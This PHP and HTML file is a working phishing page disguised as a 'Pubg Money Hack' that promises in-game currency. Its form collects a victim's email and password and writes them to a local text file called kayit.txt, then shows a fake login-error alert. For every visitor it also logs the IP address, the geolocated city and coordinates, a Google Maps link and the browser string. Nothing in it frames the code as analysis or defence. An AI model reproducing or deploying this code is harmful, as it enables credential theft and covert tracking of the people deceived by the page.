
<?php  

if (isset($_POST['login']) && isset($_POST['password'])) {

$ac = fopen("kayit.txt","a+");
$username = $_POST['login'];
$password = $_POST['password'];
$userlar = ("\n Username : ".$username."\n Password : ".$password."\n__________________ \n");
fwrite($ac,$userlar);
fclose($ac);
echo "<script>alert('Kullanıcı Adınızı veya Şifrenizi kontrol ediniz!');</script>";
}
else{
date_default_timezone_set('Europe/Istanbul');

function GetIP(){
 if(getenv("HTTP_CLIENT_IP")) {
 $ip = getenv("HTTP_CLIENT_IP");
 } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
 $ip = getenv("HTTP_X_FORWARDED_FOR");
 if (strstr($ip, ',')) {
 $tmp = explode (',', $ip);
 $ip = trim($tmp[0]);
 }
 } else {
 $ip = getenv("REMOTE_ADDR");
 }
 return $ip;
}
$ip = $_SERVER["REMOTE_ADDR"];


$tarih =" Tarih : ".date('d/m/Y  H:i');

$Geo_Plugin_XML = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$ip); 
$adress = $Geo_Plugin_XML->geoplugin_request; 
$ulke = $Geo_Plugin_XML->geoplugin_countryName;
$bolge = $Geo_Plugin_XML->geoplugin_region;
$kita = $Geo_Plugin_XML->geoplugin_continentCode;
$ulkekodu = $Geo_Plugin_XML->geoplugin_countryCode;
$sehir = $Geo_Plugin_XML->geoplugin_city;
$plaka = $Geo_Plugin_XML->geoplugin_regionCode;
$enlem = $Geo_Plugin_XML->geoplugin_latitude;
$boylam = $Geo_Plugin_XML->geoplugin_longitude;
$tarayici = $_SERVER['HTTP_USER_AGENT']; 

$maps = "https://www.google.com/maps/place/".$enlem.",".$boylam."/@".$enlem.",".$boylam.",16z";
$yamanefkar["0"] = " Ip Adresi : ".$adress;
$yamanefkar["1"] = " Ulke : ".$ulke; 
$yamanefkar["2"] = " Bolge : ".$bolge;
$yamanefkar["3"] = " Kita : ".$kita;
$yamanefkar["4"] = " Ulke Kodu : ".$ulkekodu;
$yamanefkar["5"] = " Sehir : ".$sehir;
$yamanefkar["6"] = " Plaka : ".$plaka;
$yamanefkar["7"] = " Enlem : ".$enlem;
$yamanefkar["8"] = " Boylam : ".$boylam;
$yamanefkar["9"] = " Google Maps : ".$maps;
$yamanefkar["10"] = " Tarayıcı : ".$tarayici; 


$ac = fopen("kayit.txt","a+");

$userlar = ("\n __________________ \n".$tarih."\n".$yamanefkar["0"]."\n".$yamanefkar["1"]."\n".$yamanefkar["2"]."\n".$yamanefkar["3"]."\n".$yamanefkar["4"]."\n".$yamanefkar["5"]."\n".$yamanefkar["6"]."\n".$yamanefkar["7"]."\n".$yamanefkar["8"]."\n".$yamanefkar["9"]."\n".$yamanefkar["10"]."\n\n!--VERİLER--!\n");
fwrite($ac,$userlar);
fclose($ac);
sleep(2);




}

 ?>

<!DOCTYPE html>
<html>
 <head>
  <title>
   -- Pubg V1.3 --
  </title>
 <link rel="shortcut icon" href="https://i.pinimg.com/originals/f0/62/a3/f062a3f214b208dd4eac506542f91422.png">
  <style type="text/css">
   .div1{
      background-color:#040302;
      height:75%;
      width: 100%;
      border-radius: 35px;
      border:4px solid #21160d;
      opacity: 0.8;
      filter: alpha(opacity=40);
    }
    .text{
      color:red;
      font-size: 48px;
      background-color:black;
      padding-bottom: 20px;
      border-radius: 48px; 
    }
    .text2{
      color:orange;
      font-size:28px;
      background-color:black;
      border-radius: 50px;
      padding-top: 25px;
      padding-bottom: 25px;
    }
    .input{
     height: 40px; 
     width: 250px; 
     font-size: 18px; 
     padding: 5px; 
     margin-bottom: 15px; 
     border-radius: 7px; 
     background-color:#b4b2b2; 
     border: none; 
     color: #000; 

    }
    .button{
     width: 100px; 
     font-size: 18px;  
     margin: 0 auto;
     background-color: red; 
     border: none; 
     height: 40px; 
    border-radius: 18px;
    }
     canvas { 
     display: block; 
     position: fixed; 
  top: 0; 
  left: 0; 
     z-index: -1000; 
 }
 .body{
  background: url("https://image.radionawa.com/root/root/images/1224102018_youtubegaming2560_1440.jpg") no-repeat center center fixed; 
    -webkit-background-size: cover;
    -moz-background-size: cover;
    -o-background-size: cover;
    background-size: cover;
 }
 .select{
  color:orange;
  font-size:18px;
  width:75px;
  height:40px;
  background-color:#040302;
  border-radius: 20px;
 }
  </style>
 </head>
 <body class='body'>
  <center>
   <div class="div1">
    <p class="text">
    Pubg Money Hack
    </p>
    <form method="post">
     <p class="text2">
      PUBG
     </p>
     <p style="color:red;font-size:14px;">E-MAİL</p>
     <input class="input" name="login" placeholder="xxxxxxxx@xxxxx.com" type="email"/ required="">
     <p style="color:red;font-size:14px;">Password</p>
     <input class="input" name="password" placeholder="***********" type="password"/ required=""><br>
     <select class='select'>
      <option>1000</option>
      <option>3000</option>
      <option>5000</option>
      <option>8000</option>
      <option>10000</option>
      <option>25000</option>

     </select>
     <br>
      <br>
<input type="submit" value="Next" class='button'>


</form>
</div>
</center>
</body>
</html>